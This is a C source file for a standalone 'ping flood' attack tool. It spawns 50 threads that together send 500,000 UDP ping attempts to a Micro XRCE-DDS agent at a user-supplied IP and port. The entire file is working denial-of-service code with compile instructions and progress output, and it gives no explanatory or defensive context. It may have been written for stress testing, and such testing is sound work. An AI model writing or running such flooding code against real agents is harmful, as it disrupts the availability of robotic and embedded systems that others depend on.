// Compile: gcc attack_ping_flood.c -o ping_flood -lmicroxrcedds_client -lmicrocdr -lpthread
#include <uxr/client/client.h>
#include <uxr/client/util/ping.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

#define NUM_THREADS 50
#define PINGS_PER_THREAD 10000

typedef struct {
    char* ip;
    char* port;
    int thread_id;
} ping_args_t;

void* ping_flood_thread(void* arg) {
    ping_args_t* args = (ping_args_t*)arg;
    
    printf("[Thread %d] Starting ping flood...\n", args->thread_id);
    
    for (int i = 0; i < PINGS_PER_THREAD; i++) {
        uxrUDPTransport transport;
        
        if (uxr_init_udp_transport(&transport, UXR_IPv4, args->ip, args->port)) {
            // Send ping attempts
            uxr_ping_agent_attempts(&transport.comm, 1, 5);
            uxr_close_udp_transport(&transport);
        }
        
        if (i % 1000 == 0) {
            printf("[Thread %d] Sent %d pings\n", args->thread_id, i);
        }
        
        usleep(100); // 0.1ms delay
    }
    
    printf("[Thread %d] Completed %d pings\n", args->thread_id, PINGS_PER_THREAD);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Ping Flood Attack ===\n");
    printf("Target: %s:%s\n", ip, port);
    printf("Threads: %d\n", NUM_THREADS);
    printf("Total pings: %d\n\n", NUM_THREADS * PINGS_PER_THREAD);
    
    pthread_t threads[NUM_THREADS];
    ping_args_t thread_args[NUM_THREADS];
    
    for (int i = 0; i < NUM_THREADS; i++) {
        thread_args[i].ip = ip;
        thread_args[i].port = port;
        thread_args[i].thread_id = i;
        
        pthread_create(&threads[i], NULL, ping_flood_thread, &thread_args[i]);
    }
    
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[*] Attack completed\n");
    return 0;
}
